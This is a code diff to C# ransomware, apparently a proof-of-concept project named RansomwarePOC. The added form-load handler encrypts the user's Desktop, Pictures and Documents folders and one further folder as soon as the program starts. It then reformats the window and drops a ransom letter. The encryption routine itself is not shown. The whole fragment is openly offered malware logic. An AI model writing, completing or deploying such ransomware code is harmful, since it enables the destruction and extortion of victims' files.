@@ -41,7 +41,37 @@ namespace RansomwarePOC
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            
+            initializeForm();
+
+            if (ENCRYPT_DESKTOP)
+            {
+                encryptFolderContents(DESKTOP_FOLDER);
+            }
+
+            if (ENCRYPT_PICTURES)
+            {
+                encryptFolderContents(PICTURES_FOLDER);
+            }
+
+            if (ENCRYPT_DOCUMENTS)
+            {
+                encryptFolderContents(DOCUMENTS_FOLDER);
+            }
+
+            if (ENCRYPT_FOLDER) {
+                encryptFolderContents(RANDOM_FOLDER);
+            }
+
+            if (encryptedFileCount > 0)
+            {
+                formatFormPostEncryption();
+                dropRansomLetter();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+                Application.Exit();
+            }
         }
         static void encryptFolderContents(string sDir)
         {
